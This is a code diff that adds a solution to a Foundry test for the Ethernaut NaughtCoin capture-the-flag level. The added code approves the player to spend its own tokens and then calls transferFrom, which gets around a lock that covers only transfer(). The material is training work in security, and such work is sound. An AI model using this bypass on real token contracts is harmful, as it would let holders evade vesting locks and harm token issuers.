@@ -17,5 +17,13 @@ contract NaughtCoinLevel is SetUpLevelTest {
         naughtCoin = NaughtCoin(instance);
 
         /** CODE YOUR SOLUTION HERE */
+        vm.startPrank(player);
+        naughtCoin.approve(player, naughtCoin.balanceOf(player));
+        naughtCoin.transferFrom(
+            player,
+            address(0xA11CE),
+            naughtCoin.allowance(player, player)
+        );
+        vm.stopPrank();
     }
 }
